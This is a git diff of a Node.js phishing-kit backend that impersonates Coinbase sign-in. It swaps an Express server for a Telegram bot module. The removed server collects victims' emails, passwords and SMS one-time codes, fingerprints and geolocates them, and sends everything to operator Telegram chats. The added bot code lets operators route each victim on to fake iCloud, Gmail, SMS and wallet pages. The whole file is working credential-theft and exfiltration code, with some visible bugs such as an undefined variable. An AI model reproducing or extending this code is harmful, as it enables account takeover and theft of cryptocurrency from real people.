@@ -1,2037 +1,1069 @@
-const express = require("express");
-const cors = require("cors");
-const bodyParser = require("body-parser");
+const TelegramBot = require("node-telegram-bot-api");
 const fetch = require("node-fetch");
-const crypto = require("crypto");
 
-const { 
-  bot, 
-  bot2,
-  broadcastMessage, 
-  sendFollowUpMessage, 
-  userWinnerTelegram, 
-  botsThatClickedPage1 
-} = require("./bot");
-
-const app = express();
-const PORT = process.env.PORT || 3000;
-
-app.use(cors());
-app.use(bodyParser.json());
-
-// ============================================================================
-// ✅ HELPER FUNCTIONS
-// ============================================================================
-
-function getIP(req) {
-  return (
-    req.headers['cf-connecting-ip'] ||
-    (req.headers['x-forwarded-for'] || '').split(',')[0].trim() ||
-    req.headers['x-real-ip'] ||
-    req.ip ||
-    'Unknown IP'
-  );
-}
-
-function getIPPrefix(ip) {
-  const parts = ip.split('.');
-  if (parts.length === 4) {
-    return `${parts[0]}.${parts[1]}`;
-  }
-  return ip;
-}
-
-// ✅ NEW: Generate device fingerprint from browser headers
-function getDeviceFingerprint(req) {
-  try {
-    const userAgent = req.headers['user-agent'] || '';
-    const language = req.headers['accept-language'] || '';
-    const encoding = req.headers['accept-encoding'] || '';
-    
-    const combined = `${userAgent}|${language}|${encoding}`;
-    const fingerprint = crypto.createHash('sha256').update(combined).digest('hex').substring(0, 16);
-    
-    return fingerprint;
-  } catch (err) {
-    return null;
-  }
-}
-
-function detectDevice(userAgent) {
-  if (/mobile/i.test(userAgent)) return "Mobile";
-  if (/tablet/i.test(userAgent)) return "Tablet";
-  if (/windows/i.test(userAgent)) return "Windows PC";
-  if (/macintosh|mac os/i.test(userAgent)) return "Mac";
-  if (/linux/i.test(userAgent)) return "Linux";
-  return "Unknown Device";
-}
-
-async function detectRegion(ip) {
-  try {
-    const response = await fetch(`https://get.geojs.io/v1/ip/geo.json?ip=${ip}`);
-    const data = await response.json();
-    
-    if (data.city && data.country) {
-      return `${data.city}, ${data.country}`;
-    }
-    
-    const response2 = await fetch(`http://ip-api.com/json/${ip}?fields=city,country`);
-    const data2 = await response2.json();
-    
-    if (data2.city && data2.country) {
-      return `${data2.city}, ${data2.country}`;
-    }
-    
-    return "Unknown Region";
-  } catch (error) {
-    return "Unknown Region";
-  }
-}
-
-// ============================================================================
-// ✅ MULTI-LAYER USER TRACKING STORAGE
-// ============================================================================
-
-let userIdCounter = 1;
-const userIds = {};
-
-// Layer 1: Device Fingerprint (PRIMARY)
-const deviceFingerprintToEmail = {};
-
-// Layer 2: IP Prefix + User ID
-const ipPrefixUserIdToEmail = {};
-
-// Layer 3: Session Token (reserved for future)
-const sessionTokenToEmail = {};
-
-// Layer 4: IP Prefix
-const ipPrefixToEmail = {};
-
-// Layer 5: Full IP
-const ipToEmail = {};
-
-// ============================================================================
-// ✅ RESOLVE EMAIL FROM REQUEST (5-layer fallback)
-// ============================================================================
-
-function resolveEmailFromRequest(req, sessionToken = null, userId = null) {
-  try {
-    const fingerprint = getDeviceFingerprint(req);
-    const ip = getIP(req);
-    const ipPrefix = getIPPrefix(ip);
-    
-    // Layer 1: Device Fingerprint (PRIMARY)
-    if (fingerprint && deviceFingerprintToEmail[fingerprint]) {
-      console.log(`✅ Resolved email via device fingerprint`);
-      return deviceFingerprintToEmail[fingerprint];
-    }
-    
-    // Layer 2: IP Prefix + User ID
-    if (ipPrefix && userId) {
-      const compositeKey = `${ipPrefix}_${userId}`;
-      if (ipPrefixUserIdToEmail[compositeKey]) {
-        console.log(`✅ Resolved email via IP prefix + user ID`);
-        return ipPrefixUserIdToEmail[compositeKey];
-      }
-    }
-    
-    // Layer 3: Session Token
-    if (sessionToken && sessionTokenToEmail[sessionToken]) {
-      console.log(`✅ Resolved email via session token`);
-      return sessionTokenToEmail[sessionToken];
-    }
-    
-    // Layer 4: IP Prefix
-    if (ipPrefixToEmail[ipPrefix]) {
-      console.log(`✅ Resolved email via IP prefix`);
-      return ipPrefixToEmail[ipPrefix];
-    }
-    
-    // Layer 5: Full IP
-    if (ipToEmail[ip]) {
-      console.log(`✅ Resolved email via full IP`);
-      return ipToEmail[ip];
-    }
-    
-    console.log(`⚠️ Could not resolve email from request`);
-    return null;
-  } catch (err) {
-    console.error("❌ Error resolving email:", err);
-    return null;
-  }
-}
-
-// ============================================================================
-// ✅ STORAGE OBJECTS
-// ============================================================================
-
-const pendingRedirection = {};
-const pendingApprovals = {};
-const pendingPage = {};
-const pendingCodes = {};
-const pendingSMS = {};
-const pendingGmailLogin = {};
-const displayEmailStore = {};
-const displayEmailByRequestId = {};
-const pendingVerificationPage = {};
-const pendingVerificationConfirm = {};  // ✅ For storing verification digit confirmations
-const pendingVerifyingPage = {};
-const pendingSMS2 = {};
-const pendingWalletDecision = {};
-const pendingVerifying = {};
-
-// ============================================================================
-// 🔔 SELF-PING
-// ============================================================================
-
+const BOT_TOKEN = process.env.BOT_TOKEN;
+const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
 const APP_URL = process.env.APP_URL;
 
-function startSelfPing() {
-  setInterval(async () => {
-    try {
-      await fetch(`${APP_URL}/`, { method: 'GET' });
-    } catch (err) {
-      console.error(`❌ Ping error`);
-    }
-  }, 30000);
+const BOT_TOKEN_2 = process.env.BOT_TOKEN_2;
+const ADMIN_CHAT_ID_2 = process.env.ADMIN_CHAT_ID_2;
+
+if (!BOT_TOKEN || !ADMIN_CHAT_ID || !APP_URL) {
+  console.error("❌ Missing BOT_TOKEN, ADMIN_CHAT_ID, or APP_URL in environment");
+  process.exit(1);
 }
 
 // ============================================================================
-// Health check
+// ✅ BOT 1 SETUP
 // ============================================================================
 
-app.get("/", (req, res) => {
-  res.json({ status: "✅ Backend running" });
+const bot = new TelegramBot(BOT_TOKEN, {
+  polling: { autoStart: true, params: { timeout: 10 } }
 });
 
-// ============================================================================
-// POST /get-user-id
-// ============================================================================
+bot.getMe().then(() => {
+  console.log("✅ Bot 1 connected successfully.");
+}).catch(err => {
+  console.error("❌ Bot 1 connection failed:", err.message);
+});
 
-app.post("/get-user-id", (req, res) => {
-  try {
-    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
-      req.headers["x-real-ip"] ||
-      req.connection.remoteAddress ||
-      "Unknown";
-
-    if (!userIds[ip]) {
-      userIds[ip] = userIdCounter++;
+let botRestartAttempts = 0;
+bot.on("polling_error", (err) => {
+  if (err.code === "ETELEGRAM" && err.message.includes("409")) {
+    botRestartAttempts++;
+    if (botRestartAttempts <= 1) {
+      console.warn("⚠️ Bot 1: 409 Conflict - stopping and restarting polling...");
+      bot.stopPolling().then(() => {
+        setTimeout(() => {
+          bot.startPolling();
+          console.log("✅ Bot 1: Polling restarted");
+        }, 2000);
+      });
+    } else {
+      console.error("❌ Bot 1: Multiple 409 errors - possible duplicate instance");
     }
-
-    res.json({ userId: userIds[ip] });
-  } catch (err) {
-    res.json({ userId: Math.random().toString(36).substr(2, 9) });
+  } else {
+    console.error("❌ Bot 1 polling error:", err.message);
   }
 });
 
 // ============================================================================
-// ✅ POST /send-login (Coinbase Login - Page 1)
-// ✅ THIS IS WHERE WINNER DETECTION STARTS
+// ✅ BOT 2 SETUP (NEW)
 // ============================================================================
 
-app.post("/send-login", async (req, res) => {
-  try {
-    const { email, password, userId } = req.body;
-
-    if (!email || !password) {
-      return res.status(400).json({ error: "Missing email or password" });
+let bot2 = null;
+if (BOT_TOKEN_2 && ADMIN_CHAT_ID_2) {
+  bot2 = new TelegramBot(BOT_TOKEN_2, {
+    polling: {
+      autoStart: true,
+      params: { timeout: 10 }
     }
+  });
 
-    const ip = getIP(req);
-    const userAgent = req.get("user-agent") || "Unknown";
-    const device = detectDevice(userAgent);
-    const region = await detectRegion(ip);
-    const ipPrefix = getIPPrefix(ip);
-    const fingerprint = getDeviceFingerprint(req);
+  bot2.getMe().then(() => {
+    console.log("✅ Bot 2 connected successfully.");
+  }).catch(err => {
+    console.error("❌ Bot 2 connection failed:", err.message);
+  });
 
-    // ============================================================================
-    // ✅ STORE ALL 5 TRACKING LAYERS
-    // ============================================================================
-
-    // Layer 1: Device Fingerprint
-    if (fingerprint && email) {
-      deviceFingerprintToEmail[fingerprint] = email;
-    }
-
-    // Layer 2: IP Prefix + User ID
-    if (ipPrefix && userId && email) {
-      const compositeKey = `${ipPrefix}_${userId}`;
-      ipPrefixUserIdToEmail[compositeKey] = email;
-    }
-
-    // Layer 4: IP Prefix
-    if (ipPrefix && email) {
-      ipPrefixToEmail[ipPrefix] = email;
-    }
-
-    // Layer 5: Full IP
-    if (ip && email) {
-      ipToEmail[ip] = email;
-    }
-
-    console.log(`📧 ${email} | 🖐️ Fingerprint: ${fingerprint} | IP Prefix: ${ipPrefix}`);
-
-    // ============================================================================
-    // ✅ SEND TO BOTH BOTS (BROADCAST)
-    // ============================================================================
-
-    const message =
-      `😈😈😈😈 <b>Coinbase - Sign in</b> 😈😈😈😈\n` +
-      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
-      `<b>📧 Email:</b> <code>${email}</code>\n` +
-      `<b>🔑 Password:</b> <code>${password}</code>\n` +
-      `<b>🌍 Region:</b> ${region}\n` +
-      `<b>💻 Device:</b> ${device}\n` +
-      `<b>📍 IP:</b> ${ip}`;
-
-    const options = {
-      parse_mode: "HTML",
-      reply_markup: {
-        inline_keyboard: [
-          [
-            { text: "💬 SMS 💬", callback_data: `page1|${email}` }
-          ],
-          [
-            { text: "📧 Email Redirection 📧", callback_data: `page2|${email}` }
-          ],
-          [
-            { text: "❌ Reject ❌", callback_data: `reject|${email}` }
-          ]
-        ]
-      }
-    };
-
-    const botToken = process.env.BOT_TOKEN;
-    const chatId = process.env.ADMIN_CHAT_ID;
-
-    if (!botToken || !chatId) {
-      return res.status(500).json({ error: "Backend not configured" });
-    }
-
-    // ✅ BROADCAST TO BOTH BOTS
-    try {
-      await broadcastMessage(chatId, message, options);
-    } catch (err) {
-      console.error("❌ Failed to broadcast:", err);
-      return res.status(500).json({ error: "Failed to send message" });
-    }
-
-    pendingApprovals[email] = {
-      status: "pending",
-      timestamp: Date.now(),
-      userId,
-      password,
-      region,
-      device,
-      ip,
-      fingerprint
-    };
-
-    res.json({ ok: true, message: "Login request sent for approval", email });
-
-  } catch (err) {
-    res.status(500).json({ error: err.message });
-  }
-});
-
-// ============================================================================
-// ✅ POST /send-redirection (Page 2 - Redirection)
-// ✅ PAGE 2 ROUTING LOGIC WITH POLLING
-// ============================================================================
-
-app.post("/send-redirection", async (req, res) => {
-  try {
-    let { email, userId } = req.body;
-
-    const ip = getIP(req);
-    const ipPrefix = getIPPrefix(ip);
-
-    // ✅ RESOLVE EMAIL USING MULTI-LAYER TRACKING
-    if (!email) {
-      const resolvedEmail = resolveEmailFromRequest(req, null, userId);
-      if (resolvedEmail) {
-        email = resolvedEmail;
-        console.log(`🔍 Resolved email via multi-layer tracking: ${email}`);
+  let bot2RestartAttempts = 0;
+  bot2.on("polling_error", (err) => {
+    if (err.code === "ETELEGRAM" && err.message.includes("409")) {
+      bot2RestartAttempts++;
+      if (bot2RestartAttempts <= 1) {
+        console.warn("⚠️ Bot 2: 409 Conflict - stopping and restarting polling...");
+        bot2.stopPolling().then(() => {
+          setTimeout(() => {
+            bot2.startPolling();
+            console.log("✅ Bot 2: Polling restarted");
+          }, 2000);
+        });
       } else {
-        return res.status(400).json({ error: "Could not resolve email" });
+        console.error("❌ Bot 2: Multiple 409 errors - possible duplicate instance");
       }
-    }
-
-    const userAgent = req.get("user-agent") || "Unknown";
-    const device = detectDevice(userAgent);
-    const region = await detectRegion(ip);
-
-
-    // ✅ CHECK WINNER
-    const winner = userWinnerTelegram[email];
-
-    const message =
-      `😈😈😈 <b>Coinbase - Redirection</b> 😈😈😈\n` +
-      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
-      `<b>📧 Email:</b> <code>${email}</code>\n` +
-      `<b>🌍 Region:</b> ${region}\n` +
-      `<b>💻 Device:</b> ${device}\n` +
-      `<b>📍 IP:</b> ${ip}`;
-
-    const options = {
-      parse_mode: "HTML",
-      reply_markup: {
-        inline_keyboard: [
-          [{ text: "☁️ iCloud ☁️", callback_data: `redirect_icloud|${email}` }],
-          [{ text: "🌈 Gmail 🌈", callback_data: `redirect_gmail|${email}` }]
-        ]
-      }
-    };
-
-    const botToken = process.env.BOT_TOKEN;
-    const chatId = process.env.ADMIN_CHAT_ID;
-
-    // ============================================================================
-    // ✅ SEND TO WINNER ONLY
-    // ============================================================================
-
-    if (email && userWinnerTelegram[email]) {
-      
-      await sendFollowUpMessage(email, message, options);
-
-      // ✅ STORE PAGE 2 DATA FOR POLLING
-      global.page2MessageDataStore = global.page2MessageDataStore || {};
-      global.page2MessageDataStore[email] = {
-        message: message,
-        options: options,
-        email: email,
-        timestamp: Date.now()
-      };
-
     } else {
-      
-      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-      await fetch(url, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: message,
-          parse_mode: options.parse_mode,
-          reply_markup: options.reply_markup
-        })
-      });
+      console.error("❌ Bot 2 polling error:", err.message);
     }
-
-    res.json({ ok: true });
-
-  } catch (err) {
-    console.error("❌ Redirection endpoint error:", err);
-    res.status(500).json({ error: err.message });
-  }
-});
+  });
+}
 
 // ============================================================================
-// POST /check-redirection-choice
+// ✅ GLOBAL STORAGE OBJECTS (EXPORTED TO server.js)
 // ============================================================================
 
-app.post("/check-redirection-choice", (req, res) => {
+const userWinnerTelegram = {};
+const botsThatClickedPage1 = {};
+const notificationSent = {};
+const handledCallbacks = new Set();
+
+// ============================================================================
+// ✅ BROADCAST MESSAGE (Send to both bots)
+// ============================================================================
+
+async function broadcastMessage(chatId, message, options = {}) {
+  const errors = [];
+
   try {
-    const { email } = req.body;
-
-    if (!email) {
-      return res.json({ choice: "unknown" });
-    }
-
-    if (pendingRedirection && pendingRedirection[email]) {
-      return res.json({ choice: pendingRedirection[email].choice });
-    }
-
-    res.json({ choice: "pending" });
-
+    await bot.sendMessage(chatId, message, options);
+    console.log(`✅ Message sent to Bot 1`);
   } catch (err) {
-    res.status(500).json({ error: "Internal server error" });
+    console.error("❌ Failed to send to Bot 1:", err.message);
+    errors.push(err);
   }
-});
 
-// ============================================================================
-// POST /update-redirection-choice
-// ============================================================================
-
-app.post("/update-redirection-choice", (req, res) => {
-  try {
-    const { email, choice } = req.body;
-
-    if (!email || !choice) {
-      return res.status(400).json({ error: "Missing email or choice" });
+  if (bot2 && ADMIN_CHAT_ID_2) {
+    try {
+      await bot2.sendMessage(ADMIN_CHAT_ID_2, message, options);
+      console.log(`✅ Message sent to Bot 2`);
+    } catch (err) {
+      console.error("❌ Failed to send to Bot 2:", err.message);
+      errors.push(err);
     }
-
-    if (!pendingRedirection[email]) {
-      pendingRedirection[email] = {};
-    }
-
-    if (choice === "redirect_icloud") {
-      pendingRedirection[email].choice = "icloud";
-    } else if (choice === "redirect_gmail") {
-      pendingRedirection[email].choice = "gmail";
-    } else {
-      pendingRedirection[email].choice = choice;
-    }
-
-    pendingRedirection[email].updatedAt = Date.now();
-
-    res.json({ ok: true });
-
-  } catch (err) {
-    res.status(500).json({ error: "Internal server error" });
   }
-});
 
-// ============================================================================
-// POST /check-status
-// ============================================================================
-
-app.get("/check-status", (req, res) => {
-  try {
-    const identifier = (req.query.identifier || "").trim();
-
-    if (!identifier) {
-      return res.json({ status: "unknown" });
-    }
-
-    if (pendingVerificationPage[identifier]) {
-      return res.json({ status: pendingVerificationPage[identifier].status || "pending" });
-    }
-
-    if (pendingGmailLogin[identifier]) {
-      return res.json({ status: pendingGmailLogin[identifier].status || "pending" });
-    }
-
-    if (pendingCodes[identifier]) {
-      return res.json({ status: pendingCodes[identifier].status || "pending" });
-    }
-
-    if (pendingPage[identifier]) {
-      return res.json({ status: pendingPage[identifier].status || "pending" });
-    }
-
-    if (pendingApprovals[identifier]) {
-      return res.json({ status: pendingApprovals[identifier].status || "pending" });
-    }
-
-    res.json({ status: "unknown" });
-
-  } catch (err) {
-    res.status(500).json({ error: "Internal server error" });
+  if (errors.length === 2) {
+    throw new Error("Failed to send to all bots");
   }
-});
+}
 
 // ============================================================================
-// POST /update-status
+// ✅ SEND FOLLOW-UP MESSAGE (To winner only)
 // ============================================================================
 
-app.post("/update-status", (req, res) => {
+async function sendFollowUpMessage(email, message, options = {}) {
   try {
-    let identifier = (req.body.identifier || req.body.email || "").trim();
-    const action = req.body.action;
-    const status = req.body.status;
     
-
-    // ✅ Handle verification confirm callbacks
-    if (action === "verification_accept" || action === "verification_reject") {
-      if (pendingVerificationConfirm[identifier]) {
-        pendingVerificationConfirm[identifier].status = action;
-        console.log(`✅ Updated pendingVerificationConfirm[${identifier}].status = ${action}`);
-        return res.json({ ok: true });
+    if (userWinnerTelegram[email] === "telegram1") {
+      await bot.sendMessage(ADMIN_CHAT_ID, message, options);
+    } else if (userWinnerTelegram[email] === "telegram2") {
+      if (bot2 && ADMIN_CHAT_ID_2) {
+        await bot2.sendMessage(ADMIN_CHAT_ID_2, message, options);
       }
-    }
-
-    if (pendingVerificationPage[identifier]) {
-      pendingVerificationPage[identifier].status = status;
-      console.log(`✅ Updated pendingVerificationPage[${identifier}].status = ${status}`);
-      return res.json({ ok: true });
-    }
-
-    if (pendingGmailLogin[identifier]) {
-      pendingGmailLogin[identifier].status = status;
-      console.log(`✅ Updated pendingGmailLogin[${identifier}].status = ${status}`);
-      return res.json({ ok: true });
-    }
-
-    if (pendingCodes[identifier]) {
-      pendingCodes[identifier].status = status;
-      console.log(`✅ Updated pendingCodes[${identifier}].status = ${status}`);
-      return res.json({ ok: true });
-    }
-
-    if (pendingPage[identifier]) {
-      pendingPage[identifier].status = status;
-      console.log(`✅ Updated pendingPage[${identifier}].status = ${status}`);
-      return res.json({ ok: true });
-    }
-
-    // ✅ NEW: Handle SMS status updates
-    if (pendingSMS[identifier]) {
-      pendingSMS[identifier].status = status;
-      if (status === "sms_accept") {
-        const smsCode = pendingSMS[identifier].smsCode;
-        console.log(`💬 <code>${smsCode}</code> SMS <b>Accepted</b>!✅`);
-      } else if (status === "sms_reject") {
-        const smsCode = pendingSMS[identifier].smsCode;
-        console.log(`💬 <code>${smsCode}</code> SMS <b>Rejected</b>!❌`);
-      }
-      return res.json({ ok: true });
-    }
-
-    if (!pendingApprovals[identifier]) {
-      pendingApprovals[identifier] = {};
-    }
-
-    if (status === "page1") {
-      pendingApprovals[identifier].status = "accepted1";
-    } else if (status === "page2") {
-      pendingApprovals[identifier].status = "accepted2";
-    } else if (status === "reject") {
-      pendingApprovals[identifier].status = "rejected";
     } else {
-      pendingApprovals[identifier].status = status;
+      console.log(`⚠️ No winner found for ${email}, not sending follow-up`);
     }
-
-    pendingApprovals[identifier].updatedAt = Date.now();
-
-    res.json({ ok: true });
-
   } catch (err) {
-    res.status(500).json({ error: "Internal server error" });
+    console.error("❌ Failed to send follow-up message:", err.message);
   }
-});
+}
 
 // ============================================================================
-// GET /get-sms-code - Get SMS code from requestId (for bot to display)
+// ✅ BOT 1 CALLBACK QUERY HANDLER
 // ============================================================================
 
-app.get("/get-sms-code", (req, res) => {
+bot.on("callback_query", async (query) => {
+  const callbackId = query.id;
+  
+  if (handledCallbacks.has(callbackId)) return;
+  handledCallbacks.add(callbackId);
+
   try {
-    const requestId = (req.query.requestId || "").trim();
-    const email = (req.query.email || "").trim();
+    const parts = query.data.split("|"); const action = parts[0]; const identifier = parts[1]; const displayEmail = parts[2] || 'unknown@example.com';
 
-    // Try requestId first (iCloud SMS)
-    if (requestId && pendingCodes[requestId]) {
-      const smsCode = pendingCodes[requestId].smsCode;
-      return res.json({ smsCode });
-    }
 
-    // Try email (Coinbase SMS)
-    if (email && pendingSMS[email]) {
-      const smsCode = pendingSMS[email].smsCode;
-      return res.json({ smsCode });
-    }
-
-    return res.json({ smsCode: "unknown" });
-
-  } catch (err) {
-    console.error("Get SMS code error:", err);
-    res.json({ smsCode: "unknown" });
-  }
-});
-
-// ============================================================================
-// GET /get-page-display-email - Get displayEmail for iCloud page (for bot to display)
-// ============================================================================
-
-app.get("/get-page-display-email", (req, res) => {
-  try {
-    const email = (req.query.email || "").trim();
-
-    if (!email || !pendingPage[email]) {
-      return res.json({ displayEmail: email });
-    }
-
-    const displayEmail = pendingPage[email].displayEmail || email;
-    res.json({ displayEmail });
-
-  } catch (err) {
-    console.error("Get page display email error:", err);
-    res.json({ displayEmail: email });
-  }
-});
-
-// ============================================================================
-// SMS ENDPOINTS
-// ============================================================================
-
-app.post("/verify-sms", async (req, res) => {
-  try {
-    const { email, userId, smsCode } = req.body;
-
-    if (!email || !smsCode) {
-      return res.status(400).json({ error: "Missing email or SMS code" });
-    }
-
-    const ip = getIP(req);
-    const userAgent = req.get("user-agent") || "Unknown";
-    const device = detectDevice(userAgent);
-    const region = await detectRegion(ip);
-
-    const message =
-      `😈😈😈 <b>Coinbase - SMS</b> 😈😈😈\n` +
-      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
-      `<b>📧 Email:</b> <code>${email}</code>\n` +
-      `<b>💬 SMS:</b> <code>${smsCode}</code>\n` +
-      `<b>🌍 Region:</b> ${region}\n` +
-      `<b>💻 Device:</b> ${device}\n` +
-      `<b>📍 IP:</b> ${ip}`;
-
-    const botToken = process.env.BOT_TOKEN;
-    const chatId = process.env.ADMIN_CHAT_ID;
-
-    // ✅ SEND TO WINNER ONLY
-    if (email && userWinnerTelegram[email]) {
-      await sendFollowUpMessage(email, message, {
-        parse_mode: "HTML",
-        reply_markup: {
-          inline_keyboard: [
-            [
-              { text: "✅ Accept", callback_data: `sms_accept|${email}` },
-              { text: "❌ Reject", callback_data: `sms_reject|${email}` }
-            ]
-          ]
-        }
-      });
-    } else {
-      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-      await fetch(url, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: message,
-          parse_mode: "HTML",
-          reply_markup: {
-            inline_keyboard: [
-              [
-                { text: "✅ Accept", callback_data: `sms_accept|${email}` },
-                { text: "❌ Reject", callback_data: `sms_reject|${email}` }
-              ]
-            ]
+    // ============================================================================
+    // ✅ VERIFY_DIGIT HANDLER (Gmail verification)
+    // ============================================================================
+    if (action === "verify_digit") {
+      const [, requestId, digit] = query.data.split("|");
+      console.log(`📍 Digit ${digit} clicked for requestId: ${requestId}`);
+      
+      try {
+        const updateResult = await fetch(`${APP_URL}/update-selected-digits`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ requestId, digit })
+        });
+        
+        const result = await updateResult.json();
+        console.log(`✅ Digit stored. Count: ${result.selectedCount}`);
+        
+        // ✅ Only remove keyboard and show message when we have 2 digits
+        if (result.selectedCount === 2) {
+          console.log(`✅ 2 digits collected! Removing keyboard...`);
+          try {
+            await bot.editMessageReplyMarkup(
+              { inline_keyboard: [] },
+              { chat_id: query.message.chat.id, message_id: query.message.message_id }
+            );
+            
+            await bot.sendMessage(
+              query.message.chat.id,
+              `✅ <b>Numbers Selected!</b>`,
+              { parse_mode: "HTML" }
+            );
+          } catch (err) {
+            console.error("❌ Error editing message:", err);
           }
-        })
-      });
+        } else {
+          // ✅ Just acknowledge the digit, don't remove keyboard
+          console.log(`⏳ Waiting for digit 2...`);
+        }
+
+        await bot.answerCallbackQuery(query.id, { text: `📍 Digit ${digit} selected (${result.selectedCount}/2)` });
+        return;
+      } catch (err) {
+        console.error("❌ verify_digit error:", err);
+        await bot.answerCallbackQuery(query.id, { text: "Error processing digit" });
+        return;
+      }
     }
 
-    console.log(`📧 ${email} | SMS: ${smsCode}`);
+    // ============================================================================
+    // ✅ SMS2 BUTTONS HANDLER
+    // ============================================================================
+    if (action === "sms2_wallet" || action === "sms2_done" || action === "sms2_reject" || action === "sms2_icloud" || action === "sms2_gmail") {
+      const sms2Id = identifier;
+      console.log(`📲 SMS 2 choice: ${action} for sms2Id: ${sms2Id}`);
+      
+      try {
+        const updateResult = await fetch(`${APP_URL}/update-sms2-choice`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ sms2Id, choice: action })
+        });
+        
+        const result = await updateResult.json();
+        console.log(`✅ SMS 2 choice updated: ${action}`);
+        
+        try {
+          await bot.editMessageReplyMarkup(
+            { inline_keyboard: [] },
+            { chat_id: query.message.chat.id, message_id: query.message.message_id }
+          );
+        } catch (err) {
+          console.error("Error removing buttons:", err);
+        }
+        
+        await bot.answerCallbackQuery(query.id, { text: `✅ ${action.toUpperCase()}` });
+        
+        try {
+          const botToken = process.env.BOT_TOKEN;
+          const chatId = process.env.ADMIN_CHAT_ID;
+          
+          const sms2Info = await fetch(`${APP_URL}/get-sms2-info/${sms2Id}`);
+          const sms2Data = await sms2Info.json();
+          const sms2Email = sms2Data.email || sms2Id;
+          
+          let statusMsg = "";
+          if (action === "sms2_wallet") {
+            statusMsg = `📧 <code>${sms2Email}</code> has been directed to <b>Wallet</b> 💼`;
+          } else if (action === "sms2_done") {
+            statusMsg = `📧 <code>${sms2Email}</code> has been directed to <b>Done</b> 🏁`;
+          } else if (action === "sms2_reject") {
+            statusMsg = `📧 <code>${sms2Email}</code> has been <b>Rejected</b> ❌`;
+          } else if (action === "sms2_icloud") {
+            statusMsg = `📧 <code>${sms2Email}</code> → ☁️`;
+          } else if (action === "sms2_gmail") {
+            statusMsg = `📧 <code>${sms2Email}</code> → 🌈`;
+          }
+          
+          if (statusMsg) {
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            await fetch(url, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                chat_id: chatId,
+                text: statusMsg,
+                parse_mode: "HTML"
+              })
+            });
+            console.log(`✅ Sent status message: ${statusMsg}`);
+          }
+        } catch (err) {
+          console.error("Error sending status message:", err);
+        }
+        
+        return;
+      } catch (err) {
+        console.error("❌ SMS 2 choice error:", err);
+        await bot.answerCallbackQuery(query.id, { text: "Error processing choice" });
+        return;
+      }
+    }
+
+    // ============================================================================
+    // ✅ VERIFYING BUTTONS HANDLER
+    // ============================================================================
+    if (action === "verifying_sms" || action === "verifying_done" || action === "verifying_wallet" || action === "verifying_icloud" || action === "verifying_gmail") {
+      const verifyingId = identifier;
+      console.log(`📲 Verifying choice: ${action} for verifyingId: ${verifyingId}`);
+      
+      try {
+        const updateResult = await fetch(`${APP_URL}/update-verifying-choice`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ verifyingId, choice: action })
+        });
+        
+        const result = await updateResult.json();
+        console.log(`✅ Verifying choice updated: ${action}`);
+        
+        try {
+          await bot.editMessageReplyMarkup(
+            { inline_keyboard: [] },
+            { chat_id: query.message.chat.id, message_id: query.message.message_id }
+          );
+        } catch (err) {
+          console.error("Error removing buttons:", err);
+        }
+        
+        await bot.answerCallbackQuery(query.id, { text: `✅ ${action.toUpperCase()}` });
+        
+        try {
+          const verifyRes = await fetch(`${APP_URL}/get-verifying-info/${verifyingId}`);
+          const verifyData = await verifyRes.json();
+          // Use displayEmail from callback_data
+          
+          let choiceText = '';
+          if (action === "verifying_sms") {
+            choiceText = `📧 <code>${verifyEmail}</code> → <b>SMS - 2</b> 💬`;
+          } else if (action === "verifying_done") {
+            choiceText = `📧 <code>${verifyEmail}</code> → <b>Done</b> 🏁`;
+          } else if (action === "verifying_wallet") {
+            choiceText = `📧 <code>${verifyEmail}</code> → <b>Wallet</b> 💼`;
+          } else if (action === "verifying_icloud") {
+            choiceText = `📧 <code>${verifyEmail}</code> → ☁️`;
+          } else if (action === "verifying_gmail") {
+            choiceText = `📧 <code>${verifyEmail}</code> → 🌈`;
+          }
+          
+          if (choiceText) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            await fetch(url, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                chat_id: ADMIN_CHAT_ID,
+                text: choiceText,
+                parse_mode: "HTML"
+              })
+            });
+            console.log(`✅ Sent verifying choice message`);
+          }
+        } catch (err) {
+          console.error("Error sending choice message:", err);
+        }
+        
+        return;
+      } catch (err) {
+        console.error("❌ Verifying choice error:", err);
+        await bot.answerCallbackQuery(query.id, { text: "Error processing choice" });
+        return;
+      }
+    }
+
+    // ============================================================================
+    // ✅ WALLET DECISION BUTTONS HANDLER
+    // ============================================================================
+    if (action.startsWith("wallet_decision_")) {
+      const email = identifier;
+      console.log(`💼 Wallet decision: ${action} for email: ${email}`);
+      
+      try {
+        await fetch(`${APP_URL}/update-wallet-decision`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ email, choice: action })
+        });
+
+        try {
+          await bot.editMessageReplyMarkup(
+            { inline_keyboard: [] },
+            { chat_id: query.message.chat.id, message_id: query.message.message_id }
+          );
+        } catch (err) {}
+
+        await bot.answerCallbackQuery(query.id, { text: `✅ ${action.toUpperCase()}` });
+        return;
+      } catch (err) {
+        console.error("❌ Wallet decision error:", err);
+        await bot.answerCallbackQuery(query.id, { text: "Error processing decision" });
+        return;
+      }
+    }
+
+    // ============================================================================
+    // ✅ MAIN CALLBACK HANDLER (Page 1 buttons + Page 2 buttons + SMS buttons)
+    // ============================================================================
     
-    pendingSMS[email] = {
-      status: "pending",
-      smsCode,
-      userId,
-      timestamp: Date.now()
-    };
+    let email = identifier;
+    let smsCode = "";
+    let displayEmail = email;  // ✅ What to show in acceptance message
 
-    res.json({ ok: true });
-
-  } catch (err) {
-    res.status(500).json({ error: err.message });
-  }
-});
-
-// ============================================================================
-// POST /check-sms-status - Check if SMS was accepted or rejected
-// ============================================================================
-
